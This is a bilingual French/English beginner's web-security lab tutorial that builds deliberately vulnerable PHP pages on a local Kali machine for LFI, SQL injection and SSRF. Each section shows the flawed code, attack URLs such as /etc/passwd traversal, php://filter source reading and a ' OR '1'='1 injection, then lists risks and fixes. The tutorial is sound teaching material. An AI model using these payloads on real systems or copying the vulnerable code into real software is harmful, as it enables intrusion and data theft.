# 🕵️‍♀️ Labo Web Vulnérable – Étape 1 : LFI (Local File Inclusion)

Bienvenue dans mon petit laboratoire de cybersécurité où j'explore des failles classiques du web de manière pédagogique et accessible.
Vous trouvez mes labs en LFI, SQLi et SSRF.

👉 [Lire en français](#-partie-1--en-français) | [Read in English](#-part-2--in-english)

---

## 🇫🇷 Partie 1 – En français

### 📖 Histoire d'une faille : LFI expliquée simplement

Bienvenue dans cette petite aventure où je découvre l’une des failles les plus sournoises du web : **LFI**, ou **Inclusion de Fichier Local**.

Imagine que tu es dans une maison. Tu as le droit d’ouvrir certains **tiroirs** : ceux de ta chambre, par exemple. Mais un jour, tu découvres que si tu modifies un petit paramètre dans l’URL du site… tu peux ouvrir **les tiroirs des autres pièces**, même ceux contenant des informations privées 😮.

C’est exactement ce que fait une faille **LFI** : elle permet de lire des fichiers sensibles du serveur, juste en modifiant une URL.

### 🧱 Mise en place de mon laboratoire sous Kali Linux

#### ✅ 1. Mise à jour du système

```bash
sudo apt update && sudo apt upgrade -y
```

#### ✅ 2. Installation du serveur Apache2

```bash
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2
```

Je teste : `http://localhost` → ✅ Apache fonctionne !

#### ✅ 3. Installation de PHP

```bash
sudo apt install php libapache2-mod-php -y
```

#### ✅ 4. Création de mon projet Web

```bash
cd /var/www/html
sudo mkdir web-lab
sudo chown -R $USER:$USER web-lab
cd web-lab
```

Création de `index.php` :

```php
<?php echo '✅ Le lab fonctionne !'; ?>
```

Test dans le navigateur : `http://localhost/web-lab/` → ✅ OK !

### 💣 Création de la faille LFI

Fichier : `lfi.php`

```php
<?php
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    echo "Aucune page spécifiée.";
}
?>
```

### 🧪 Tests réalisés

**1. Inclusion d’un fichier local**

```bash
http://localhost/web-lab/lfi.php?page=test.txt
```

**2. Inclusion d’un fichier système**

```bash
http://localhost/web-lab/lfi.php?page=../../../../etc/passwd
```

**3. Lecture du code source (base64)**

```bash
http://localhost/web-lab/lfi.php?page=php://filter/convert.base64-encode/resource=lfi.php
```

### 🚨 Risques identifiés

- Lecture de fichiers système sensibles
- Fuite de code source
- Exécution de code si combinée à un upload malveillant

### 🛡️ Prévention

- Jamais inclure une valeur brute venant de l’utilisateur
- Utiliser une **liste blanche**
- Nettoyer avec `realpath()`, `basename()`, `filter_var()`

### ✅ Ce que j’ai appris

Un simple `include($_GET['page'])` peut exposer tout un serveur.

---

## 🇬🇧 Part 2 – In English

### 📖 LFI explained like a story

Welcome to a little web security adventure. I’m exploring **LFI** (Local File Inclusion), a common and dangerous vulnerability.

Imagine you’re in a house. You’re allowed to open **your drawers**. But one day, you discover a trick that lets you open **other people's drawers**… even the secret ones 😱

That’s what **LFI** does — it lets attackers read server files by abusing an insecure `include()`.

### 🧱 Setting up my lab on Kali Linux

#### ✅ 1. System update

```bash
sudo apt update && sudo apt upgrade -y
```

#### ✅ 2. Apache2 installation

```bash
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2
```

I checked: `http://localhost` → ✅ It works!

#### ✅ 3. PHP installation

```bash
sudo apt install php libapache2-mod-php -y
```

#### ✅ 4. Project creation

```bash
cd /var/www/html
sudo mkdir web-lab
sudo chown -R $USER:$USER web-lab
cd web-lab
```

File: `index.php`

```php
<?php echo '✅ The lab works!'; ?>
```

Tested at `http://localhost/web-lab/` → ✅ Success!

### 💣 LFI vulnerability file: `lfi.php`

```php
<?php
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    echo "No page specified.";
}
?>
```

### 🧪 Exploitation steps

**1. Including a local file**

```bash
http://localhost/web-lab/lfi.php?page=test.txt
```

**2. Including system file**

```bash
http://localhost/web-lab/lfi.php?page=../../../../etc/passwd
```

**3. Reading source code via base64**

```bash
http://localhost/web-lab/lfi.php?page=php://filter/convert.base64-encode/resource=lfi.php
```

### 🚨 Risks

- Sensitive file disclosure
- Source code leakage
- Code execution if combined with upload

### 🛡️ Protection

- Never include raw user input
- Use a whitelist
- Sanitize input with `realpath()`, `basename()`, `filter_var()`

### ✅ What I’ve learned

Just one `include($_GET['page'])` can expose the whole server.

# 🩸 Labo Web Vulnérable – Étape 2 : SQL Injection (SQLi)

👉 [Lire en français](#-partie-1--en-français) | [Read in English](#-part-2--in-english)

---

## 🇫🇷 Partie 1 – En français

### 📖 Une faille invisible : l'injection SQL racontée simplement

Imagine un serveur de restaurant. Tu lui dis : "Je veux une soupe." Tout va bien. Mais maintenant, imagine que tu lui dis : "Je veux une soupe — et aussi ouvre le coffre-fort de la cuisine." Et il le fait 😳

C’est exactement ce que permet une **injection SQL** : glisser des commandes malveillantes dans un champ innocent. Le serveur web envoie alors ces commandes à la base de données sans les filtrer.

---

## 🧱 Mise en place du labo

#### ✅ 1. Démarrer MariaDB

```bash
sudo systemctl start mariadb
sudo systemctl enable mariadb
```

#### ✅ 2. Se connecter en root

```bash
sudo mysql
```

#### ✅ 3. Créer la base + utilisateurs

```sql
CREATE DATABASE vuln_sql;
USE vuln_sql;

CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(100),
  password VARCHAR(100)
);

INSERT INTO users (username, password) VALUES
('admin', 'adminpass'),
('jessica', 'mypassword'),
('guest', '12345');
```

#### ✅ 4. Créer un utilisateur MySQL dédié

```sql
CREATE USER 'labuser'@'localhost' IDENTIFIED BY 'labpass';
GRANT ALL PRIVILEGES ON vuln_sql.* TO 'labuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

---

## 🧪 Fichier vulnérable : `sqli.php`

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$conn = new mysqli("localhost", "labuser", "labpass", "vuln_sql");
if ($conn->connect_error) {
    die("Connexion échouée : " . $conn->connect_error);
}

$id = $_GET['id'] ?? '';
$sql = "SELECT * FROM users WHERE id = '$id'";
$result = $conn->query($sql);

if ($result && $result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "👤 Utilisateur : " . $row["username"] . "<br>";
    }
} else {
    echo "Aucun utilisateur trouvé.";
}
?>
```

---

## 🧪 Tests SQLi

### 🔍 1. Test classique

```
http://localhost/web-lab/sqli.php?id=1
```
✅ Résultat : `👤 Utilisateur : admin`

### 🔥 2. Injection

```
http://localhost/web-lab/sqli.php?id=1' OR '1'='1
```
✅ Résultat : tous les utilisateurs s’affichent

### 🧪 3. Exploration

```
?id=1' ORDER BY 3-- -
```

---

## 🚨 Risques

- Fuite de données confidentielles
- Connexion sans mot de passe
- Modification ou suppression de données
- Contrôle total de la base (RCE possible dans certains cas)

---

## 🛡️ Contre-mesures

- Utiliser des requêtes préparées (PDO / mysqli)
- Filtrer les entrées (`intval()`, `filter_input()`)
- Ne jamais faire confiance aux données GET/POST

---

## 🇬🇧 Part 2 – In English

### 📖 SQLi explained simply

Imagine telling a waiter: "I want soup." That's fine. But what if you say: "I want soup — and open the kitchen's safe"? And he does. 😳

This is **SQL Injection**: sneaking malicious commands into input fields that get passed to the database unchecked.

---

## 🧱 Lab setup (Kali Linux + MariaDB)

### ✅ 1. Start MariaDB

```bash
sudo systemctl start mariadb
sudo systemctl enable mariadb
```

### ✅ 2. Connect to MySQL

```bash
sudo mysql
```

### ✅ 3. Create DB and data

```sql
CREATE DATABASE vuln_sql;
USE vuln_sql;

CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(100),
  password VARCHAR(100)
);

INSERT INTO users (username, password) VALUES
('admin', 'adminpass'),
('jessica', 'mypassword'),
('guest', '12345');
```

### ✅ 4. Create lab user

```sql
CREATE USER 'labuser'@'localhost' IDENTIFIED BY 'labpass';
GRANT ALL PRIVILEGES ON vuln_sql.* TO 'labuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

---

## 🧪 Vulnerable file: `sqli.php`

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$conn = new mysqli("localhost", "labuser", "labpass", "vuln_sql");
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$id = $_GET['id'] ?? '';
$sql = "SELECT * FROM users WHERE id = '$id'";
$result = $conn->query($sql);

if ($result && $result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "👤 User: " . $row["username"] . "<br>";
    }
} else {
    echo "No user found.";
}
?>
```

---

## 🧪 Exploitation

### 1. Normal query

```
http://localhost/web-lab/sqli.php?id=1
```
✅ Output: `👤 User: admin`

### 2. SQLi attack

```
http://localhost/web-lab/sqli.php?id=1' OR '1'='1
```
✅ Output: all users returned

### 3. Enumeration

```
?id=1' ORDER BY 3-- -
```

---

## 🚨 Risks

- Dumping sensitive data
- Bypassing authentication
- Data tampering or deletion
- Full DB control (or even RCE)

---

## 🛡️ Prevention

- Use prepared statements (PDO or mysqli)
- Sanitize inputs (`intval()`, `filter_input()`)
- Never trust GET/POST data

---
# 🌐 Labo Web Vulnérable – Étape 3 : SSRF (Server-Side Request Forgery)

👉 [Lire en français](#-partie-1--en-français) | [Read in English](#-part-2--in-english)

---

## 🇫🇷 Partie 1 – En français

### 📖 Une faille invisible : quand le serveur devient ton messager

Imagine que tu veux entrer dans un bâtiment sécurisé. Impossible. Mais tu trouves un facteur (le serveur) à qui tu peux dire : "Va livrer ce message à l’intérieur." Et il le fait. Sans poser de questions.

C’est ça, une **SSRF** (Server-Side Request Forgery). Tu ne peux pas accéder directement à certaines ressources, mais tu demandes **au serveur** d’y aller **à ta place**.

---

## 🔧 Pourquoi j'ai testé en local (127.0.0.1)

Au départ, je voulais tester avec un site externe comme `http://example.com`, mais mon environnement (Kali Linux en VM) **n’avait pas accès à Internet**. Le ping vers `example.com` échouait, et la résolution DNS ne fonctionnait pas dans le navigateur non plus.

Alors j’ai opté pour une **approche réaliste** : tester en local.

👉 Et c’est encore **plus intéressant**, car les vraies attaques SSRF ciblent souvent **les services internes** comme `127.0.0.1`, `localhost`, `admin panels`, `metadata servers`, etc.

---

## 🧱 Mise en place du fichier vulnérable `ssrf.php`

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $response = file_get_contents($url);
    echo "<pre>$response</pre>";
} else {
    echo "Aucune URL fournie.";
}
?>
```

Ce fichier **accepte n’importe quelle URL** en paramètre, et demande au serveur d’aller la consulter. C’est là que réside la faille.

---

## 🧪 Tests réalisés

### ✅ 1. Requête locale (test réussi)

```
http://localhost/web-lab/ssrf.php?url=http://127.0.0.1/web-lab/sqli.php?id=1
```

💥 Résultat : le serveur appelle **un autre script PHP interne** (`sqli.php`) et en affiche la réponse.

---

## 🛑 Erreur rencontrée (test externe échoué)

```
http://localhost/web-lab/ssrf.php?url=http://example.com
```

❌ Résultat : erreur `getaddrinfo failed`, car `example.com` n’est pas résolu dans mon environnement.

---

## 🚨 Risques liés à SSRF

- Lecture de données internes (non accessibles directement)
- Scan de ports internes (via des boucles)
- Accès à des services d’administration ou d’API internes
- Accès aux metadata cloud (ex: AWS `169.254.169.254`)

---

## 🛡️ Contre-mesures recommandées

- Bloquer les IP privées (127.0.0.1, 169.254..., etc.)
- Désactiver `file_get_contents()` pour les URLs (utiliser cURL avec validation)
- Filtrage strict des URLs autorisées (whitelist)
- DNS pinning pour éviter les contournements

---

## ✅ Ce que j’ai appris

Même sans Internet, j’ai pu tester une **SSRF locale**, et c’est justement **le scénario le plus réaliste** dans un vrai contexte d’attaque.

---

## 🇬🇧 Part 2 – In English

### 📖 The invisible attack: turning the server into your messenger

Imagine you're outside a building. You can’t get in. But you find a mailman (the server) and say: “Can you deliver this message inside for me?” And he does.

That’s what **SSRF** is: Server-Side Request Forgery. You can’t access something directly, but you trick the server into doing it **on your behalf**.

---

## 🔧 Why I tested it locally (127.0.0.1)

I initially tried using `http://example.com`, but my Kali Linux VM didn’t have Internet access. Pinging `example.com` failed, and PHP couldn’t resolve the domain.

So I went for a **more realistic approach**: local SSRF.

👉 In real attacks, SSRF is most useful when targeting **internal services** like `localhost`, internal panels, or metadata endpoints.

---

## 🧱 Vulnerable file: `ssrf.php`

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $response = file_get_contents($url);
    echo "<pre>$response</pre>";
} else {
    echo "No URL specified.";
}
?>
```

This file accepts **any URL** and asks the server to fetch it. That’s the vulnerability.

---

## 🧪 Tests performed

### ✅ 1. Local SSRF test (success)

```
http://localhost/web-lab/ssrf.php?url=http://127.0.0.1/web-lab/sqli.php?id=1
```

💥 Result: the server calls another internal script and displays the output.

---

## 🛑 External request failed

```
http://localhost/web-lab/ssrf.php?url=http://example.com
```

❌ Result: `getaddrinfo failed`, because DNS resolution failed in my environment.

---

## 🚨 Risks

- Internal data exposure
- Internal port scanning via SSRF loops
- Access to admin or service panels
- Metadata theft (e.g. AWS `169.254.169.254`)

---

## 🛡️ Prevention

- Block internal IP ranges (127.*, 169.*, etc.)
- Don’t use `file_get_contents()` with URLs
- Use cURL with strict filtering or a whitelist
- Protect DNS resolution from manipulation

---

## ✅ What I learned

Even without Internet, I was able to test a **realistic SSRF** scenario — the most relevant one from a security perspective.

---
